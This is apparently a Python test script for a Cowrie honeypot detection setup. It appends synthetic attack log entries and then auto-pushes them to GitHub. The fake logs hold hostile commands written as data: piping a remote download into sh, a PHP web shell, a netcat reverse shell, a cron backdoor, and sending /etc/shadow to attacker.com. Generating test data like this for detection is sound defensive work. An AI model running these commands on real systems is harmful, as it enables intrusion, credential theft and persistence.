#!/usr/bin/env python3
"""
COMPLETE ATTACK TESTING SUITE
Tests ALL attack types → Auto-detects → Pushes to GitHub LIVE
"""

import json
import time
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Dict, List
import random
import string

class AttackTester:
    def __init__(self):
        self.log_path = Path("var/log/cowrie/cowrie.json")
        self.submitted_path = Path("detections/submitted_logs.json")
        self.alerts_path = Path("detections/attack_alerts.json")
        
    def generate_random_ip(self) -> str:
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    def generate_random_string(self, length=8) -> str:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def submit_log(self, log_entry: dict):
        """Submit log and auto-push"""
        log_entry["test_generated"] = True
        log_entry["generated_at"] = datetime.now().isoformat()
        
        # Append to main log
        with open(self.log_path, 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
        
        print(f"📨 SUBMITTED: {log_entry.get('src_ip', 'N/A')} - {log_entry.get('eventid', 'unknown')}")
    
    def auto_git_push(self):
        """Auto push everything"""
        try:
            subprocess.run(['git', 'add', '.'], capture_output=True)
            subprocess.run(['git', 'commit', '-m', f'🤖 Attack test: {datetime.now().strftime("%H:%M:%S") }'], capture_output=True)
            subprocess.run(['git', 'push'], capture_output=True)
            print("🚀 LIVE PUSH TO GITHUB!")
        except:
            pass
    
    # 🔥 ATTACK 1: SSH BRUTEFORCE
    def test_ssh_bruteforce(self, ip: str = None, count: int = 20):
        print(f"\n🔥 [1/12] TESTING SSH BRUTEFORCE ({count} attempts)")
        ip = ip or self.generate_random_ip()
        
        for i in range(count):
            self.submit_log({
                "eventid": "cowrie.login.failed",
                "src_ip": ip,
                "username": ["root", "admin", "user", "test"][i % 4],
                "password": self.generate_random_string(8),
                "timestamp": datetime.now().isoformat()
            })
            time.sleep(0.1)
        
        self.auto_git_push()
    
    # 🔥 ATTACK 2: SUCCESSFUL LOGIN
    def test_successful_login(self):
        print("\n🔥 [2/12] TESTING SUCCESSFUL LOGIN")
        self.submit_log({
            "eventid": "cowrie.login.success",
            "src_ip": self.generate_random_ip(),
            "username": "root",
            "password": "correct_password",
            "session": self.generate_random_string(12),
            "timestamp": datetime.now().isoformat()
        })
        self.auto_git_push()
    
    # 🔥 ATTACK 3: RECONNAISSANCE COMMANDS
    def test_reconnaissance(self):
        print("\n🔥 [3/12] TESTING RECONNAISSANCE")
        recon_cmds = [
            "whoami", "id", "uname -a", "cat /etc/passwd", "ls -la", 
            "pwd", "env", "ps aux", "netstat -an", "ifconfig"
        ]
        ip = self.generate_random_ip()
        
        for cmd in recon_cmds:
            self.submit_log({
                "eventid": "cowrie.command.input",
                "src_ip": ip,
                "session": "session123",
                "input": cmd,
                "timestamp": datetime.now().isoformat()
            })
            time.sleep(0.2)
        
        self.auto_git_push()
    
    # 🔥 ATTACK 4: MALWARE DOWNLOAD
    def test_malware_download(self):
        print("\n🔥 [4/12] TESTING MALWARE DOWNLOAD")
        urls = [
            "wget http://evil.com/malware.sh",
            "curl -O http://malware.net/backdoor.elf",
            "wget -q -O - http://hacker.ru/payload | sh"
        ]
        ip = self.generate_random_ip()
        
        for url in urls:
            self.submit_log({
                "eventid": "cowrie.command.input",
                "src_ip": ip,
                "session": "session456",
                "input": url,
                "timestamp": datetime.now().isoformat()
            })
        
        self.auto_git_push()
    
    # 🔥 ATTACK 5: PRIVILEGE ESCALATION
    def test_priv_esc(self):
        print("\n🔥 [5/12] TESTING PRIVILEGE ESCALATION")
        cmds = ["sudo su", "sudo -i", "su root", "./exploit"]
        ip = self.generate_random_ip()
        
        for cmd in cmds:
            self.submit_log({
                "eventid": "cowrie.command.input",
                "src_ip": ip,
                "session": "session789",
                "input": cmd,
                "timestamp": datetime.now().isoformat()
            })
        
        self.auto_git_push()
    
    # 🔥 ATTACK 6: WEB SHELL UPLOAD
    def test_webshell(self):
        print("\n🔥 [6/12] TESTING WEB SHELL UPLOAD")
        self.submit_log({
            "eventid": "cowrie.command.input",
            "src_ip": self.generate_random_ip(),
            "session": "session_web",
            "input": "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/shell.php",
            "timestamp": datetime.now().isoformat()
        })
        self.auto_git_push()
    
    # 🔥 ATTACK 7: CRYPTO MINING
    def test_crypto_miner(self):
        print("\n🔥 [7/12] TESTING CRYPTO MINING")
        self.submit_log({
            "eventid": "cowrie.command.input",
            "src_ip": self.generate_random_ip(),
            "session": "session_miner",
            "input": "wget http://pool.minergate.com/minergate && chmod +x minergate && ./minergate -user hacker",
            "timestamp": datetime.now().isoformat()
        })
        self.auto_git_push()
    
    # 🔥 ATTACK 8: DDoS PREP
    def test_ddos_prep(self):
        print("\n🔥 [8/12] TESTING DDOS PREPARATION")
        self.submit_log({
            "eventid": "cowrie.command.input",
            "src_ip": self.generate_random_ip(),
            "session": "session_ddos",
            "input": "wget https://github.com/hacker/ddos-bot/releases/latest/download/bot && ./bot 1000 target.com",
            "timestamp": datetime.now().isoformat()
        })
        self.auto_git_push()
    
    # 🔥 ATTACK 9: RANSOMWARE
    def test_ransomware(self):
        print("\n🔥 [9/12] TESTING RANSOMWARE")
        self.submit_log({
            "eventid": "cowrie.command.input",
            "src_ip": self.generate_random_ip(),
            "session": "session_ransom",
            "input": "curl ransomware.exe && ./ransomware.exe --encrypt /home",
            "timestamp": datetime.now().isoformat()
        })
        self.auto_git_push()
    
    # 🔥 ATTACK 10: LATERAL MOVEMENT
    def test_lateral_movement(self):
        print("\n🔥 [10/12] TESTING LATERAL MOVEMENT")
        cmds = ["ssh internal-server", "nc -e /bin/sh 192.168.1.100 4444"]
        ip = self.generate_random_ip()
        
        for cmd in cmds:
            self.submit_log({
                "eventid": "cowrie.command.input",
                "src_ip": ip,
                "session": "session_lateral",
                "input": cmd,
                "timestamp": datetime.now().isoformat()
            })
        
        self.auto_git_push()
    
    # 🔥 ATTACK 11: PERSISTENCE
    def test_persistence(self):
        print("\n🔥 [11/12] TESTING PERSISTENCE")
        self.submit_log({
            "eventid": "cowrie.command.input",
            "src_ip": self.generate_random_ip(),
            "session": "session_persist",
            "input": "echo '* * * * * /tmp/backdoor' >> /etc/crontab",
            "timestamp": datetime.now().isoformat()
        })
        self.auto_git_push()
    
    # 🔥 ATTACK 12: DATA EXFIL
    def test_data_exfil(self):
        print("\n🔥 [12/12] TESTING DATA EXFILTRATION")
        self.submit_log({
            "eventid": "cowrie.command.input",
            "src_ip": self.generate_random_ip(),
            "session": "session_exfil",
            "input": "cat /etc/shadow | nc attacker.com 4444",
            "timestamp": datetime.now().isoformat()
        })
        self.auto_git_push()
    
    def run_full_suite(self):
        """Run ALL 12 attack types"""
        print("🚀 STARTING COMPLETE ATTACK TESTING SUITE")
        print("=" * 60)
        
        attacks = [
            self.test_ssh_bruteforce,
            self.test_successful_login,
            self.test_reconnaissance,
            self.test_malware_download,
            self.test_priv_esc,
            self.test_webshell,
            self.test_crypto_miner,
            self.test_ddos_prep,
            self.test_ransomware,
            self.test_lateral_movement,
            self.test_persistence,
            self.test_data_exfil
        ]
        
        for i, attack in enumerate(attacks, 1):
            attack()
            print(f"✅ Attack {i}/12 completed")
            time.sleep(1)
        
        print("\n🎉 FULL ATTACK SUITE COMPLETE!")
        print("📊 Check GitHub for LIVE results!")
    
    def test_single_attack(self, attack_name: str):
        """Test single attack type"""
        method = getattr(self, f"test_{attack_name}", None)
        if method:
            method()
        else:
            print(f"❌ Unknown attack: {attack_name}")

def main():
    tester = AttackTester()
    
    if len(sys.argv) > 1:
        if sys.argv[1] == "full":
            tester.run_full_suite()
        else:
            tester.test_single_attack(sys.argv[1])
    else:
        print("Usage:")
        print("  ./attack_tester.py full          # Run all 12 attacks")
        print("  ./attack_tester.py ssh_bruteforce # Single attack")
        print("Attacks: ssh_bruteforce, successful_login, reconnaissance, malware_download, ...")

if __name__ == "__main__":
    main()
